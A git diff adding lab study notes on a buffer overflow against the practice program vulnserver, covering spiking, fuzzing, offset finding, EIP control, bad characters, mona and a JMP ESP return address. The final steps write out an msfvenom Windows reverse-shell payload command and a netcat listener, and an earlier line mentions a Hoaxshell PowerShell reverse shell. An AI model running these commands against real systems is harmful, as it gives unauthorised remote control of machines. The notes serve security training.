@@ -705,4 +705,142 @@ It’s basically a wrapper around the OpenAI API.
   - step two is t create payload and listener using Hoaxshell for poweshell in reverse shell generator GUI (in target machine we have run this code in powershell terminal) 
 
 * Perform Buffer Overflow Attack to Gain Access to a Remote System :~
-  -    
+  - Tools we are using:
+    - vulnerable server
+    - immunity debugger
+  - EIP = Extended Instruction Pointer
+  - ESP = Extended Stack Pointer  
+  - in windows run vulnserver.exe as a administrator
+  - run immune debugger as a administrator and attach vuln server to immune debugger and run this
+  - sudo su and cd for root directory
+  - nc -nv <target ip> <target port> (this command is used to make connection between host mechine and target server)
+    - nc = netcat 
+    - -n = don't resolve the DNS 
+    - -v = verbos   
+
+  - First step is spiking step using spiking templets: 
+    - pluma stats.spk
+     //we are inserting these three line code into stats.spk
+    ```console
+        s_readline();
+        s_string("STATS ");
+        s_string_variable("0");
+    ```
+    ```console
+        generic_send_tcp <target_ip> <target_port> <stats.spk_file> 0 0
+    ```    
+      - generic_send_tcp = its a spike templet or tool used to connect the tcp server
+      - first 0 = starting position 
+      - second 0 = delay(there is no delay between packets)
+     //after the stats spiking exicution go to windows and check the immune debugger and vulnserver it was vulnerable or not wheather its vuln the immune debugger is pause it is not vuln means running
+    
+    - pluma trun.spk
+     //we are inserting these three line code into trun.spk
+    ```console
+        s_readline();
+        s_string("TRUN ");
+        s_string_variable("0"); 
+    ```
+    ```console
+        generic_send_tcp <target_ip> <target_port> <trun.spk_file> 0 0
+    ``` 
+      //after the stats spiking exicution go to windows and check the immune debugger and vulnserver it was vulnerable or not wheather its vuln the immunity debugger is pause it is not vuln means running
+
+  - Second step is fuzzing using fuzz.py(using python script):
+    //using shared directory we will copy script folder from windows to our system
+    - go to the network option in our linux
+    ```console
+        smb://10.10.1.11
+      //make your directory as script
+        cd /home/attacker/Desktop/Scripts/
+        chmod +x fuzz.py
+        ./fuzz.py 
+      //after this exicution go to windows and check immunity debugger the program is crached but EIP is not overwriten by the python script  
+    ```
+    - in this fuzzing method it will say vulnerable server crashed after receiving approximately 10200 bytes of data, but it did not overwrite the EIP register
+    - After fuzzing and testing different values, it was found that sending 5100 bytes of data to the vulnerable application overwrites the EIP register.
+    
+  - Third step is Finding Offset using findoff.py and creating pattern for finding offset(using python script):
+    - we get offset here = offset means The point where EIP gets overwritten  
+   //run as administrator for vuln server and immunity debugger
+  ```console
+   //before finding offset you have create a pattern
+      /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400
+  ``` 
+    - copy the pattern of 10400 bytes whatever you want you can create and paste it in findoff.py
+  ```console 
+      pluma findoff.py
+      chmod +x findoff.py
+      ./findoff.py     
+  ```
+    - In the Immunity Debugger window, you can observe that the EIP register is overwritten with random bytes. Note down the random bytes in the EIP and find the offset of those byte
+    - sudo su in new terminal and cd for root directory
+  ```console
+      /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337
+  ```
+    - -q = query
+    - -l = length
+    - you will get offset of that bytes
+
+  - Fourth step is Overwrite EIP using overwrite.py:
+    - using this method we make sure over EIP offset is correct or not
+   //run as administrator for vuln server and immunity debugger
+  ```console 
+      chmod +x overwrite.py 
+      ./overwrite.py
+  ```
+    - switch to the Windows 11 machine. You can observe that the EIP register is overwritten and EIP is showing as 42424242 
+    - now we conform our offset is correct 
+    - now we can go to control the EIP 
+
+  - Fifth step is identify bad characters(because they may cause issues in the shellcode):
+    - bad char might be stop our payloads also     
+   //run as administrator for vuln server and immunity debugger 
+    - chmod -x badchars.py
+    - ./badchars.py
+    - In Immunity Debugger, click on the ESP register value -->right click on ESP and Follow in Dump option
+    - ofter this there is not bad charectors
+  
+  - Sixth step is mona method:
+   //run as administrator for vuln server and immunity debugger 
+    - mona helps to identify the right module of the vulnerable server that is lacking memory protection
+    - copy mona.py and paste it to C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
+    - in bottom of the immunity debugger you will get text box over their 
+    - !mona modules(press enter)
+    - you can see which module have no memory protection and we will exploit that module inject shellcode and take full control of the EIP register
+
+  - Seventh step is converted using converter.py(we get Hex code):
+   //run as administrator for vuln server and immunity debugger
+  ```console  
+      sudo su
+      cd 
+      python3 /home/attacker/converter.py  
+      Enter the assembly code here : JMP ESP
+    //you will get Hex code
+      !mona find -s "\xff\xe4" -m essfunc.dll
+    //you get the return address of the vulnerable module  
+  ```  
+    - In the Immunity Debugger window, click the Go to address in Disassembler icon and Enter expression to follow option and enter the return address in that box
+
+  - Eigth step is jump usng jump.py
+    - we can use this for jump from EIP to ESP
+    - EIP register has been overwritten with the return address of the vulnerable module
+    - chmod +x jump.py
+    - ./jump.py
+
+  - Nighth Step is shell code method using shell code method:
+   - first we have to create shell code using msfvenom(metasploit)
+  ```console 
+   - msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00 
+  ```
+   - copy that shell code and paste that code into the shellcode.py
+   - pluma shellcode.py
+   - we will run the Netcat command to listen on port in another terminal
+   - nc -nvlp <host_port>
+   - chmod +x shellcode.py (in first terminal)
+   - ./shellcode.py
+   - in listening port terminal shell access to the target vulnerable server has been established
+   
+
+
+
